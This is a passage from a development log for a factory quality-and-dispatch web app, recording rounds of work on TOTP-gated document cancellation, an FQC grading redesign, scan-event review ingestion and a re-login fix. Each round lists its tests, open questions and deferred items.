document" screen was a disabled placeholder. icon_auth.stepup_cancel() existed
from Stage 1a but nothing in app.py called it. This round builds the whole thing:
Admin and Super Admin can cancel every document type directly, with a TOTP
step-up at submit, no exceptions.

### The four-column pattern, one shape everywhere

status ('active' default), cancelled_reason, cancelled_by, cancelled_at - the
exact four challan already carried - added by store.py's _migrate ALTER/IF NOT
EXISTS to: **indent, gatepass, production_entry, loss_event, invoice**. Existing
rows backfill to 'active'. challan already had them.

### The step-up, one shared check

_require_stepup(cur, body) reads {totp_code} and calls stepup_cancel() BEFORE any
type-specific refusal, so a wrong or replayed code refuses identically whatever
the document's state - a prober learns nothing from which error returns.
stepup_cancel already carries the replay guard (a code used to sign in has
advanced totp_last_step and is refused here), confirmed not reimplemented. Every
cancel endpoint (all seven) is @require_role(*_R_ADMIN): a wrong role is refused
before the body runs, never a per-screen-permission decision.

### The refusal condition per type - FLAGGED for Mukesh's review

Some were inferred from the state machine rather than told directly. Correct any
that are wrong for the process:

- **Indent** - refuse if any serial in any allocation on any of its lines has
  left 'planned' (production has acted). Mirrors allocation withdrawal's own rule
  exactly, one level up (indent -> line -> allocation -> serial).
- **Production Entry** - refuse if any serial it recorded has left
  'planned'/'produced' into FQC or beyond (graded/rejected/hold/packed/
  dispatched). On success its serials revert to 'planned' and prod_entry_id is
  cleared, so the range can be re-recorded - the same "revert what I did" the
  challan cancel does with its serials. (Checked: serial.prod_entry_id is set
  exclusively by the production-entry route, and 'produced' is set only for
  serials still 'planned'.)
- **Loss Event** - refuse a PRIMARY event while an active INDUCED event names it
  (linked_event_id), which would orphan the induced stop whose double-count
  exclusion depends on it; otherwise allowed. (Checked: linked_event_id is the
  only thing built on an individual event; dashboards read events only in
  aggregate.)
- **Gate Pass** - **allowed unconditionally** (only "already cancelled" stops
  it). Checked the gatepass table: it has NO post-issue lifecycle state - a gate
  pass is created AT the moment of leaving (audit 'gatepass.issue'), there is no
  dispatched flag, and no return/close workflow (return_date is never written -
  db.py notes this). Nothing downstream reads a gate pass's outcome; its one
  linkage is that a module gate pass locks its challan, and cancelling the gate
  pass is exactly how that lock is released to unwind the challan - so it must
  NOT be refused for having a challan. **This is the one most in need of Mukesh's
  confirmation**: if a real "dispatched/left" state is added later, key a refusal
  on it here.
- **Invoice** - refuse while a live (non-cancelled) challan reconciles against it
  (challan.invoice_id). The same shape challan's own cancel uses to refuse while
  a gate pass references it, one FK up. The existing /invoice/cancel (discards an
  unsaved upload) is untouched - this is a new, separate /api/invoice/<id>/cancel.

### Challan and allocation - unchanged apart from who and the step-up

Both moved from @require_screen_write to @require_role(*_R_ADMIN) and gained the
step-up. Their refusal RULES are unchanged: challan still issued-only with no
referencing gate pass; allocation still all-serials-'planned'. The existing tests
for those rules pass, with the TOTP code added to the calls (the rule assertions
themselves are untouched). The screen-write meta-test moved both endpoints off
its per-screen map (40 -> 38 functions) onto its role-gate assertion.

### The Admin > Cancel document screen

The disabled placeholder is replaced (the live layer swaps the #ad-cancel pane,
as Evidence Sources does #ad-stations). Pick a type, enter the document id, see
what cancelling will do, give a reason and an authenticator code, cancel. On
refusal the server's exact reason shows. A wrong code and a wrong-state document
read differently on screen ON PURPOSE: the caller is an authenticated Admin, to
whom the endpoint gives the specific reason; what section 3 keeps
indistinguishable is what an UNauthenticated prober could learn, and such a
caller never passes the role gate. The distinction is the UI reading its own
request outcome, not a probe.

### Deferred, explicitly

Hierarchical cancellation - request/approve, per-role cancel paths, escalation,
a second approver for a dispatched document - is a LATER feature. This round is
Admin/Super Admin direct cancel only, for every type. No other role gets any
cancel path yet. Downstream list/aggregate filtering on the new 'cancelled'
status (e.g. excluding a cancelled loss event from OEE, a cancelled invoice from
the available-invoice picker) is a separate follow-up; this round builds the
cancel mechanism, the refusal rules, the step-up and the screen.

### Tests

test_cancel_documents.py - the whole matrix across all seven endpoints: success
+ status flip + audit; wrong role (before TOTP); wrong code; not-cancellable with
its specific reason; the replay guard; no-code. 7 passed.
test_cancel_screen.py (Playwright) - each of the seven cancelled end to end
through the screen, a blocked invoice refused with its real reason, a wrong code
shown differently. 4 checks passed; screenshots in round34_shots/.
Existing suites unchanged: test_challan (55), test_gatepass (11), test_loading
(14), test_screen_write_gates (9), test_review (8), test_indent (7),
test_production (12), test_role_gates (11), test_screen_perms (20),
test_inner_role_checks (7), and the auth/UI harness suites.

### Round 34 follow-up (found in review)

**1. A cancelled document must actually leave the workflow.** The first pass
flipped `status` but nothing downstream honoured it - a cancelled indent still
showed in the Indents list (as OPEN), kept its Edit button, and an edit saved.
Fixed for every type, the challan way (absent from the working list, kept for
search/history):
  - working lists now exclude cancelled rows: indent (db.indent_progress),
    gate pass (gatepasses_list), production entry, loss event, invoice (and the
    challan invoice picker);
  - edit/mutate paths refuse a cancelled document: indent edit (PUT), gate pass
    edit (PUT), loss close, and an induced loss stop may not name a cancelled
    primary (challan edit already refused a non-issued challan).

**2. The screen took an internal id, not the number a person knows.** Entering an
indent NUMBER (IS2I/26/0003) built /api/indent/IS2I/26/0003/cancel, which the
indent GET/PUT route's <path:indent_no> swallowed and rejected as 405 HTML ->
"The server did not answer." Added /api/cancel/lookup (Admin/SA) resolving the
real number - indent no, gate pass no, invoice no, a rendered challan no
(IS-09.09.2026/4242; challan has no stored number column, matched by rendering
each), indent-no#line-no, or a bare id - to the internal id + current state.
The screen resolves on the way in and resolves-then-cancels on submit.

**3. New granularities (approved by Mukesh, this round):**
  - **Indent LINE cancel** - `/api/indent/line/<id>/cancel`. Cancels one line of
    a multi-item indent, the others stay live; refused if that line's allocation
    has left 'planned'. indent_line gains the four cancel columns; a cancelled
    line leaves the list (db.indent_progress subquery); last line cancelled =
    indent effectively gone.
  - **Serial cancel (single + printed range)** - `/api/serials/cancel`. Sets
    state='cancelled' while a serial is still planned/produced; refused once FQC
    has judged it or it's packed/dispatched. Range uses Production Entry's
    same-printed-batch rule; all-or-nothing.
  - **FQC grade cancel (single + range)** - `/api/fqc/cancel`. Voids the standing
    (non-superseded) FQC record and reverts the serial to 'produced' so it can be
    graded again; refused once packed/dispatched. Distinct from re-grading, which
    supersedes. fqc_record gains the four cancel columns.
  All three are Admin/Super Admin + the shared TOTP step-up, and appear in the
  Cancel document screen (serial/range go straight to the serial endpoints; the
  line resolves by indent-no#line-no).

**Refusal rules for the new granularities - flagged for Mukesh** (same as their
whole-document parents): indent line = its allocation still all-'planned';
serial = still planned/produced; FQC grade = module not yet packed/dispatched.

**Still deferred:** hierarchical cancellation (request/approve, per-role,
escalation, second approver). Downstream aggregate filtering on 'cancelled' where
a list does not already exclude it (e.g. a cancelled loss event dropping out of
OEE) beyond the working lists fixed above.

Tests: test_cancel_documents.py extended - a cancelled doc leaves every list and
its edit/close is refused; the lookup resolves numbers/rendered-challan/ids
(unknown->404, non-admin->403); indent line, serial (single+range) and FQC
(single+range) cancel with their refusals and the serial-state reversions. 12
passed. test_cancel_screen.py extended - cancel by real number, and the indent
line / serial / serial range / FQC grade all through the screen.

### Round 34 follow-up 2 (found in review of the follow-up)

**1. A cancelled FQC grade kept reading as a standing Pass/Reject everywhere
else in the app.** Same class of bug as follow-up #1, one level down: the
ENDPOINT'S OWN table stopped being "live" on cancel, but every OTHER place
reading "the live FQC record" (`superseded_by IS NULL`) had no idea a cancel
existed and kept counting/showing the voided grade. Fixed at every site that
picks the live record:
  - Search & Trace's module journey (api_trace_serial) - a cancelled record no
    longer shows Pass/Reject; it shows a "Cancelled" card naming what the grade
    WAS, who cancelled it and the reason, instead of silently falling back to
    "not judged yet" (which would have hidden that a decision was made and undone);
  - `db.fqc_recent()` (FQC Recent Gradings) excludes cancelled the same way it
    already excludes superseded;
  - `/api/fqc/dashboard` and `/api/fqc/dashboard/modules` (FQC Dashboard, its
    shift/model table and its module drill-down);
  - Management Overview's `fl` CTE (the "latest live FQC record per serial"
    join used for its own stats) and `_shift_rows()` (the FQC Dashboard's own
    shift table).
  `db.py`/`app.py` locations still reading `superseded_by IS NULL` alone were
  audited one by one; two (`quality_pending`, `provisional_pending`) were left
  untouched because the cancel already reverts `state` away from the value
  those queries filter on ('rejected'/'hold'), so a cancelled record cannot
  appear there regardless.

**2. The event log named the entity but silently dropped the VERB, for every
audited action, not only cancellation.** `action` is stored "entity.verb"
(`fqc.cancel`, `planning.cancel`, `challan.cancel`, ...); the trace event log
showed only the entity half (`stage = action.split(".")[0].title()`), so a
cancel row read as generic "Fqc" - nothing on the row said "cancelled"
anywhere, even though the actor (`Mukesh Naik`) WAS already shown correctly in
the User column. Fixed generally: stage is now "Entity · Verb" for every
audited row (`"Fqc · Cancel"`, `"Planning · Allocate"`, ...), and the FQC
grading rows (a second, separate log source from the fqc_record table itself)
now say "Fqc · Cancelled" and append who cancelled it and why when that record
was voided, instead of silently continuing to show "Grade A · manual" with no
sign anything happened to it since.

**3. The Cancel screen's lookup only accepted a row id for allocation and loss
event, not the display number the rest of the app actually shows.** Reported:
Planning & Allocation lists a batch as `BAT-2609-00003` with a Withdraw button;
typing that exact string into the Cancel screen gave "No allocation matches
'BAT-2609-00003'." The resolver had a challan-shaped special case but nothing
for allocation's `BAT-YYMM-NNNNN` (the existing `batch_no()` renderer - the
trailing 5 digits ARE the alloc_id) or loss event's `DT-<id>` (`_loss_display_id`,
already shown on the Loss screen and Search & Trace). Both added to
`/api/cancel/lookup`, reusing the exact regex/format each already renders with -
no new numbering scheme invented.

**4. The screen didn't reset for the next entry, and every type shared one
generic placeholder.** Fixed: every field (reference, second reference, reason,
code) clears after a successful cancel AND when the type dropdown changes (a
serial left in the box after switching to Indent would just be confusing
against a new placeholder of a different shape). Each type now shows its own
realistic example - `IS2I/26/0001` for an indent, `IS2I/26/0001#2` for a line,
`ISGP260928/0007` for a gate pass, `IS-28.09.2026/0007` for a challan,
`BAT-2609-00007` for an allocation, `DT-42` for a loss event,
`ICON625R1292420778` for a serial. Production Entry is deliberately left
honest rather than inventing a plausible-looking format: "its internal id — no
printed number yet" - it has no printed reference number at all yet, a
separate, later fix.

Tests: test_cancel_documents.py +2 (journey/event-log verb and cancellation
wording; cancelled FQC gone from Recent/Dashboard/module drill-down) +1
(allocation/loss-event lookup by their real display numbers) - 15 passed.
test_cancel_screen.py +2 checks (every field clears after success; each type's
placeholder is its own, not shared) - 8 checks passed. Full regression
unchanged: cancel_documents 15, indent 7, loss 10, production 12, fqc 57,
search_invoice 16, challan 55, gatepass 11, screen_write_gates 9, dashrath 6,
fqc_override 9, review 8, dashboards_ist 13; JS via cscript (screens 17, trace
33, challan 35, packing 26, fqc_dashboard 18, loading 24, repack 27).

### Round 34 follow-up 3 - the same "still reads as live" question, asked of

Prompted directly: "you fixed FQC to reflect which reads the live record, but
what about the others in the dropdown?" Right question - FQC was not special.
Traced, for each of the other 8 cancellable types, every OTHER place in the
app that used to assume it could never be cancelled. Nine real gaps found and
fixed, none cosmetic - each let the app act as though a cancelled document
were still live:

1. **`gp_count_for_challan()`** counted a CANCELLED gate pass as still
   "referencing" its challan - so cancelling a gate pass never actually
   released the challan lock it exists to release. Fixed once, in the shared
   helper; fixes all three callers (challan cancel, edit-draft, edit-save).
2. **`api_gatepass()`'s duplicate check** ("this challan already has a gate
   pass") counted a cancelled one too, refusing a fresh gate pass for a
   challan whose old one was voided.
3. **`api_loading_submit()`'s idempotency check** (Loading Verification's own
   "safe to resubmit") found the cancelled gate pass and handed its DEAD
   gp_no back as if current, instead of minting a live one.
4. **Allocation create** had no check at all for the indent line (or its
   parent indent) being cancelled - Planning could still allocate a fresh
   serial range against a line that had been voided.
5. **Allocation update** had the same gap for growing/editing an existing
   allocation against a since-cancelled line.
6. **`boot_private()`'s own `indents` array** - which Planning's own
   `pIndent`/`pIndentLine` dropdowns are built from directly
   (`planDropdowns()` reads `B.indents`) - listed cancelled indents and
   cancelled lines exactly as live ones. This is the one that matches the
   original screenshot's own list-omission bug, one level down: fixing
   `/api/indents` (the Indent SCREEN's list) said nothing about Planning's
   own copy of the same data, fetched at boot into a different structure.
7. **`_challan_precheck()`** checked an invoice for `superseded_by` but never
   for `status='cancelled'` - the picker already excluded one, but a direct
   call or a stale/pasted invoice id would sail through to E-QTY/E-EWB checks
   without ever being told the invoice is void. Added E-CANCELLED.
8. **Production Dashboard's own downtime stats** (closed-in-period totals,
   and the "still open, needs a decision" count) read `loss_event` with no
   status filter at all - a cancelled event kept adding minutes to OEE-style
   totals and could keep counting as "needs a decision" if cancelled while
   still open.
9. **FQC grading (`api_fqc_grade`)** had no refusal for a cancelled serial's
   state at all - a cancelled serial could still be graded, which makes the
   cancellation meaningless. Refused before the packed/dispatched
   duplicate-scan branch.

`_line_payload()` now carries one shared `cancelled` flag (true if the line OR
its parent indent is cancelled), read by both allocation endpoints and by
`boot_private()`'s filtering - one source of truth instead of each caller
re-deriving it from the two status columns.

Not changed, checked and found already safe: box scanning already refuses
anything but state='graded' (an allowlist, not a denylist, so 'cancelled'
falls into the existing generic refusal with no change needed); Production
Entry already clears `prod_entry_id` unconditionally on cancel, so every join
that follows that FK sees nothing for a cancelled entry's serials without
being told to filter anything.

**Flagged, not fixed - a policy question, not a bug**: can a NEW Production
Entry range be recorded over a serial that was individually cancelled (via
`/api/serials/cancel`, not a whole-entry cancel)? Today `state` is
deliberately NOT checked when validating a range (a serial already
graded/rejected is not a conflict, by design) - a cancelled serial in the
middle of an otherwise-valid printed range would currently be recorded under
the entry anyway (its own state stays 'cancelled', but its qty/kw_output would
be counted and prod_entry_id set). Whether that should refuse the whole range,
silently exclude the cancelled serial from the count, or is fine as-is is
Mukesh's call, not assumed here.

Tests: test_cancel_documents.py +5 (gate pass cancel releases the challan
lock and permits a fresh one; cancelled line refused at allocation
create/leaves Planning's dropdown; cancelled invoice flagged E-CANCELLED at
challan pre-check; cancelled loss event leaves the Production Dashboard's
downtime totals; cancelled serial refused at FQC grading) - 20 passed. Full
regression unchanged: challan 55, gatepass 11, gatepass_multiitem 9, loading
14, indent 7, production 12, loss 10, fqc 57, fqc_override 9, search_invoice
16, review 8, dashboards_ist 13, screen_write_gates 9, dashrath 6; JS via
cscript (screens 17, trace 33, challan 35, packing 26, fqc_dashboard 18,
loading 24, repack 27).

### Round 34 - everything still open, in one place

Four sub-rounds (s1-s7, then three follow-ups) touched a lot of surface.
Consolidated here so nothing is scattered - this is the full list of what
Round 34 deliberately deferred plus what was found late and not yet fixed.
Work on this paused here to focus on the FQC redesign; pick up from this list.

**Deliberately deferred (scope, not bugs):**
- **Hierarchical cancellation** - request/approve, per-role cancel paths,
  escalation, a second approver for a dispatched document. Round 34 is
  Admin/Super Admin DIRECT cancel only, for every type. No other role has any
  cancel path yet.
- **Production Entry has no printed reference number.** Its cancel takes the
  internal id; the Cancel screen says so honestly ("no printed number yet")
  rather than inventing a format. A real reference number for Production
  Entry is a separate, later piece of work.

**Found, not yet fixed - each needs a decision, not a guess:**
- **A cancelled FQC grade can leave a stale Needs Review item behind.**
  Confirmed: an open `review_item` (duplicate_scan or provisional_mismatch)
  that points at an fqc_id keeps showing in `/api/review` after that
  fqc_record is cancelled - Quality can still be asked to resolve a
  "Provisional vs evidence" conflict about a decision that no longer stands.
  Needs a decision: does cancelling the FQC record auto-close any open review
  item that names it (and with what resolution), or does Review need its own
  "the underlying record was cancelled" state? Do NOT guess at this - it
  changes what Quality is told to act on.
- **Production Entry range validation does not look at `state='cancelled'`.**
  A serial individually cancelled via `/api/serials/cancel` could still be
  swept into a NEW production entry's printed range (state is deliberately
  not checked there today, for an unrelated reason - see api_prodentry's own
  comment). Should the whole range refuse, or should a cancelled serial be
  silently excluded from the count? Mukesh's call.
- **Search & Trace's non-serial results (challan/invoice/batch/vehicle/
  customer) were not audited for a clear "cancelled" indicator** the way the
  serial journey now shows one. The serial journey fix (follow-up 2) covered
  only the module journey; whether searching a cancelled challan/invoice
  NUMBER directly shows its cancelled status as plainly is unverified.
- **Admin > Audit trail is still v4's own unwired demo tab** - `auditRows` is
  never populated from `dispatch_audit`, so none of the richer stage/verb/actor
  information the event log fix (follow-up 2) added is visible there, only on
  a module's own Search & Trace page. Wiring a real Audit trail screen was
  never in scope for Round 34 and is its own piece of work.
- **The nine-gap sweep (follow-up 3) was thorough, not exhaustive.** It
  covered every call site found by tracing each type's own foreign keys and
  status columns; a genuinely new cancellable type added later needs the same
  trace repeated for it, not assumed safe by analogy.

Nothing above blocks Round 34 as shipped: every cancel endpoint, its refusal
rule, its step-up, its screen, and the specific "must leave every list"
fixes made along the way are real and tested (20 tests in
test_cancel_documents.py, 8 checks in test_cancel_screen.py, full regression
green). What is listed here is what a NEXT pass on this feature should read
first, rather than rediscovering it.

---

## Round 35 - FQC redesign, defect vocabulary, event recording (Stages 1-5)

Six stages were scoped: 1 unblocked fixes, 2 defect vocabulary (blocked on
the EL share listing, then unblocked once Mukesh gave the address), 3 the
FQC screen redesign (propose/confirm-overrule removed), 4 change history
(entity_revision, station by station), 5 event recording (not-in-master, SS
skip, looked-up-no-decision, FTR anomalies), 6 export - **not started.**
Stopped here on usage limits, mid-session, with real production issues found
live and only partly resolved. Read this whole section before continuing -
several items below are not "nice to have," they are active data quality
problems in the live database right now.

### Stage 1 - done
- A passed module keeps its EL defect (`app.py` duplicate-scan path and the
  main grading path both dropped the `outcome == 'reject'` guard).
- Dead legacy `/fqc` form route and `templates/fqc.html` deleted (`_pass_route()`
  superseded it; nothing posted there).
- `BACKLOG.md:1216`'s "a pass cannot be overruled" struck through with the
  SS-wattage-floor-is-unchanged note.
- Three stale schema comments fixed; dashboard's category rollup now shows
  "Rejected → A (Quality)" as its own row (`app.py`, `static/icon_live.js`).

### Stage 2 - done
- `icon_defects.py`: unified 53-code `DEFECT_MASTER` - 45 from the operator
  visual list (`FQC_DEFECTS` in `icon_live.js`) + 8 confirmed live off
  `\\169.254.1.247\el` (both lines run the same machine/software, so one
  listing covers both). `FOLDER_NAMES`/`FOLDER_MAP` normalise spelling/case
  variants ("low eff" vs " low eff", both seen on the real share) to one
  code. Labels are Title Case, `OK` excluded (not a defect).
- `defect_master` / `defect_folder_map` tables, seeded once by
  `store._seed_defects()`, never re-seeded once populated.
- `db.defects()` / `db.defect_code_for_folder()` / `db.defect_code_for_text()`.

### Stage 3 - done
- `icon_evidence.propose_outcome()` deleted. `gather()` returns evidence
  only - no proposed verdict.
- `app._pass_route()` rewritten: EL is advisory only, never gates a pass or
  forces a reject. Only SS state + the module's own wattage decide
  `direct` / `provisional` (SS unreachable, held) / `None` (BAD, NA, or
  below wattage).
- `/api/fqc` POST: no coded reason anywhere any more. Reject requires a
  defect (the EL's own verdict satisfies it if non-clean); Pass's defect is
  always optional and the EL verdict auto-attaches regardless of outcome,
  via the new `fqc_defect` table (`source` = 'el'|'fqc', many rows per
  `fqc_record`, one predicate for "defect = X" across pass/reject/any
  grade). `fqc_record.proposed/reason/defect` kept for history, not written.
  New: `defect_el_raw`, `test_seq`, `rule_version`.
- Screen (`icon_live.js`): Pass / Reject / Discard, no PROPOSED block.
  Space = Pass, enabled only when EL reads clean AND Pmax meets wattage
  (EL can never block a pass, but the one-key shortcut is deliberately more
  conservative than the rule itself). Defect picker now sourced from
  `/api/fqc/defects` (fetched once the FQC view actually renders for a role
  that can see it - an earlier version fetched unconditionally at parse
  time and 403'd every role with no FQC access, caught by
  test_dashrath_case.py).
- `test_fqc_override.py` deleted; `test_fqc.py` / `test_fqc_screen.py`
  rewritten around the new rules (54 + 15 tests).

### Stage 4 - done, station 1 of N
- New `entity_revision` table (actor, at, entity_type, entity_id, action
  'create'|'update', before/after JSON) - distinct from `change_log`
  (pub/sub refetch signal, no entity/action/before-after) and from
  `dispatch_audit` (one free-form detail blob, used everywhere already).
  Deliberately NOT wired everywhere yet - only `db.record_fqc()` (create)
  and `db.record_quality()` (update, real before/after row). **Extending
  this to every other write point (cancellation, allocation, indent,
  gatepass, etc.) is explicitly future work, one station at a time - do not
  do it all at once, per the original instruction.**

### Stage 5 - done, but see the live findings below before trusting the numbers
- `review_item` extended: `raw_id`, `source`, `line`, `detected_at`, unique
  on `(type, raw_id)` for idempotent re-ingest (index created in
  `store.py`'s migration, after the ALTER, not in the schema file's
  unconditional executescript - it would fail on an existing database
  otherwise).
- `icon_ingest.py`: four detectors - `scan_not_in_master` (split
  malformed/unplanned), `scan_ss_skip` (in master + EL image + no SS row
  anywhere), `scan_looked_up_no_decision` (new `fqc_lookup_log` table),
  `scan_ftr_anomalies` (persists `icon_evidence.scan_anomalies()`'s own
  junk/failed rows). Reads both the live SS CSV and a configured archive
  path (`ss_archive_path` / `ss_a_archive_path` / `ss_b_archive_path`,
  archive-then-live ordered so a truncating tail-slice never starves the
  live file's own recent rows). `start_background()` polls every 60s,
  wired into `serve.py` (not `app.py` - tests and the dev reloader must not
  run a filesystem poller). `/api/review` also runs a best-effort pass on
  open, so the feed does not depend solely on the poller.
- `/api/review/resolve` gained ingest-item handling: `not_in_master_unplanned`
  is refused until the serial is actually found in the master (Incharge
  plans it with an indent first); every other ingest type is a plain
  acknowledge. Both gated on Production Shift Incharge or above. Needs
  Review's action column now routes these to their own modal
  (`reviewOpenIngest`/`reviewSubmitIngest`) instead of silently mis-firing
  the duplicate-scan resolver, which is what it did before this fix.
- **Mid-session addendum, not in the original six-stage brief:** once this
  ran against the real production feed, `not_in_master_unplanned` was
  found sitting at 960 open items after a few hours - not five in a shift,
  hundreds, because a module rescanned repeatedly before Incharge plans it
  was creating one review item PER SCAN. Fixed:
  - One review item per SERIAL for `not_in_master_unplanned`, not per scan
    (`db.ingest_review_item_latest()`, upsert on `(type, raw_id=serial)`).
    Other ingest types unchanged (still per-raw-scan, since they were not
    the ones flooding).
  - New `ftr_reading` table: the Sun Simulator reading is saved (latest
    scan wins) the moment a serial is flagged unplanned, because the live
    CSV and its archive will not hold that row forever - by the time
    Incharge gets to planning it, the original row may have rotated away.
  - `_fqc_payload()` (`app.py`) falls back to the saved `ftr_reading` when
    the live scan comes back NA, so FQC can grade a retroactively-planned
    serial using the reading it already has - no re-test, no stopping the
    line to satisfy bookkeeping that happened late.
  - `test_icon_ingest.py` (13 tests) covers all of the above, including the
    fallback surviving a fully-rotated (empty) live CSV.

### FLAGGED - pending decisions and unfinished cleanup, read before touching this again

- **The running production `serve.py` process has NOT picked up the Stage 5
  addendum fix.** Python loads modules at process start; editing
  `icon_ingest.py`/`db.py`/`app.py` on disk does nothing to an already-running
  process. Until `serve.py` is restarted, the poller is still running the
  OLD code and will keep creating a new `not_in_master_unplanned` row per
  scan, not per serial. **Restart is required for the fix to take effect -
  not done yet, needs sign-off on when.**
- **~960 duplicate `not_in_master_unplanned` rows are sitting in the live
  database right now**, all for a much smaller set of genuinely-unplanned
  serials, product of the per-scan bug above before it was found. The code
  fix stops NEW duplicates; it does not retroactively collapse what is
  already there. A one-time cleanup was proposed (keep the most recent open
  row per serial, re-key it so future rescans update it correctly, mark the
  rest resolved as `merged_duplicate` - not deleted, closed) but **not run
  - awaiting explicit go-ahead**, since it is a direct mutation of ~960 rows
  in the live production database, not a code change.
- **Whether 960-in-one-day unplanned serials is itself normal for this line
  is still an open question**, separate from the duplicate-row bug. It may
  mean Planning/Incharge's indent-and-allocation step is genuinely lagging
  line output by that much, which would be a real operational problem the
  software is now correctly surfacing for the first time (it used to be
  thrown away entirely) rather than a defect in the detector. Needs
  Mukesh's read on whether that volume is expected for this line right now.
- **`entity_revision` (Stage 4) is wired for FQC's two write points only.**
  Cancellation (Round 34), allocation, indent, gatepass and everything else
  still have no before/after audit trail - deliberately deferred, per the
  original "station by station, not all at once" instruction, but it is
  still a gap, not a finished feature.
- **Stage 6 (export) has not been started at all** - Excel/CSV, the
  `test_count`/`test_seq` main + test-history feeds, the two known
  cancelled-row gaps in `db.fqc_recent(include_superseded=True)` and
  `db.serials_for()` (`/export/serials.csv` currently emits cancelled
  serials un-marked). All still open exactly as the original brief
  described them.
- **The old `/export/fqc.csv` ad hoc export** (`app.py`, `export_csv`) still
  writes `proposed`/`reason` columns that Stage 3 stopped populating - not
  broken (they will just read empty for every new row), but stale, and
  Stage 6 should replace this ad hoc export rather than patch it.
- **`icon_ingest.scan_ss_skip`'s EL bulk listing is new, unaudited code**
  (`_el_recent_files()`, walking date/shift/category folders directly,
  distinct from `read_el()`'s single-serial search). It has unit tests
  against a synthetic folder tree but has not been run against the real EL
  share at volume the way Stage 2's vocabulary was confirmed live - worth a
  live check before trusting its "4 in a shift" count the way the brief
  described it.


---

## Round 36 - signing in again, FQC before Planning, and the defect nobody could see

Three things Mukesh reported, and a fourth found on the way through the same
flow. Each was checked against real data - the real Sun Simulator CSV, the
tester's result files and the EL share, all read-only - on a COPY of the live
database. Nothing was written to the live file.

### 1. "Signed in, but the app's data could not be loaded" after a session timeout

**What he saw.** The session times out, the page says "sign in again", he signs
in and gets that message. A plain refresh then loads it. Only Admin and Super
Admin.

**Root cause** (reproduced in a browser, and it was never the data - `/api/boot`
succeeded). v4's `initAll()` runs on every sign-in and reaches `cancelCheck()`,
which reads v4's own Cancel-document inputs (`#cnType`, `#cnReason`). Round 34's
`cancelDocSetup()` replaces that whole pane, so on a SECOND run in the same page
those inputs are gone and the call throws. On a fresh page load it never showed
(the swap happens after the first `initAll()`), which is why a refresh fixed it,
and why only the roles that get the pane were hit. `enterApp()`'s one `.catch`
then reported every exception as "the data could not be loaded" and threw the
real error away.

**What changed** (`static/icon_live.js`).
- `cancelCheck()` is wrapped (not replaced): with v4's inputs absent it does
  nothing. That is the fix.
- The catch-all is split. Only a failure to GET the data says "the data could
  not be loaded". A failure while BUILDING the screens is `_buildFailed()`: the
  real error goes to the console, and a page that has already been in the app
  reloads once by itself (the path that always worked; once only, in
  sessionStorage, so it cannot loop); a permanent fault says "the screens could
  not be built (<reason>)".

A sweep for what else piles up when the app is entered twice on one page found
the top-bar "SQLite" badge being added again on EVERY sign-in (3 -> 4 -> 5 -> 6):
it is now one element, reused. Global `document`/`window` listeners, nav
buttons, views and element ids do not grow (checked through the debugging
protocol).

**Proved by** `test_relogin.py` (6, real Chromium): a REAL idle expiry then
sign-in as Super Admin on the same page; sign-out then sign-in for four roles;
an unknown re-entry failure reloads once and opens the app; a permanent failure
is honest and does not loop; a genuine `/api/boot` failure still says the data
could not be loaded; nothing grows across re-entries. Mutation-checked: with the guard disabled the first two
fail.

### 2. FQC on a serial the master does not have yet

**What he saw.** `ICON625R1292130846` is in the Sun Simulator AND on the EL and
not in the master, and "it was not being added for review". His rule: let the FQC
happen; once Incharge plans it, a pass goes to pack and otherwise Quality
decides; making the module do FQC again after Planning - stopping the line,
loading it back - is not worth it; and keep its FTR in the database, the latest
one if the module is scanned again.

**What it really was.**
- It WAS recorded (twice, by the old per-scan poller) but Needs Review was sent
  only the newest 200 open ingest items of ALL types. It was #840 and #681 of
  1,308. Recorded, and not on the screen.
- FQC refused any serial not in the master, so the module could not be graded.
- Its Sun Simulator row had left the CSV (cut at 23:45; no archive is
  configured), and nothing had saved its reading.

**What changed.**
- `icon_evidence`: when the CSV has no row, the tester's own result file
  (`<data>\XML\<yyyymmdd>\<serial>.xml`, one per module, overwritten by a
  retest - verified column for column against the CSV row of the same module) is
  read before NA is claimed. `ss_from_xml` says so. The root is derived from the
  CSV's location unless `ss_xml_root` names it; only a real-shaped serial is ever
  turned into a file name.
- `icon_evidence.read_el`: an EL image still directly under its SHIFT folder (the
  operator files it under its verdict a few minutes later) is NA with its path -
  it used to read the shift's name ("晚班") as the verdict, which also let a
  rejection through with no defect at all.
- `app._fqc_payload` / `api_fqc_grade`: a serial not in the master is accepted
  when the testers have seen it (a reading, a probe fault, or an EL image); a
  serial nobody has seen is refused ("check the barcode") - but only when the
  testers could be READ; if the Sun Simulator or the EL cannot be reached the
  refusal says which link is down instead, since "nothing filed" is not known.
  Wattage and model come
  from `decompose()`, the parse Planning runs. The decision is recorded against a
  serial with no row; the module goes on Needs Review and its reading is saved.
  PACKING still refuses it.
- `api_allocation_create/update` -> `db.apply_standing_fqc` in the SAME
  transaction as the serial rows: confirmed pass -> graded A (packable); held
  pass -> hold; reject -> rejected (Quality's queue). The Needs Review item
  closes itself (`resolution='planned'`, who and why on it). A cancelled decision
  does not come back. No re-test.
- `icon_ingest`: reading is separated from writing (a slow share no longer holds
  the database write lock); one item per SERIAL standing for its LATEST scan
  (`review_item.event_at`); the SS reading is saved once and refreshed only by a
  newer test, and backfilled for open items that have none (CSV, then XML,
  bounded per pass); items close themselves when the serial is planned by any
  route; an item reopens if the module is not in the master again. A pass that
  finds nothing new WRITES NOTHING (it used to stamp the change feed every minute
  - an INSERT ... DO NOTHING is still a write to it).
- `/api/review` no longer runs the ingest inside the GET. With it, two idle
  Needs Review windows re-ran it for each other without end (measured: 20 writes
  in 45 s, nobody touching anything). serve.py's poller is the only thing that
  runs a pass.
- `/api/review` sends EVERY open item, not the newest 200, each with the saved
  reading and where FQC stands. The screen gains "Not in master" and "Scan
  events" tabs with counts (they had no tab and were buried under "All"), puts
  what a person must DECIDE first, and offers "Plan it" instead of a manual
  resolve.
- Recent gradings tags a decision made before Planning "Not in master" (it has
  no model yet); Needs Review timestamps are ISO like every other item (the
  testers' `2026/09/29` format sorted after every ISO one of the same day).
- `store.py`: one-time, idempotent merge of the old per-scan rows into one per
  serial (closed as `merged_duplicate`, not deleted). On a copy of the live DB:
  1,319 open rows for 1,089 serials -> 1,089, 230 merged. Also `fqc_record` had
  NO index at all (every lookup and the "looked up, no decision" scan were full
  scans - measured quadratic: 1k rows 0.04 s, 8k rows 1.82 s); `ix_fqc_record_serial`
  added, that scan bounded to 3 days, and the lookup log pruned at 14.

**Proved by** `test_fqc_unplanned.py` (37), `test_evidence.py` (41, +11:
result-file fallback, unfiled EL, no path traversal), `test_relogin.py`, and the
real-data loop below. Existing suites unchanged and green.

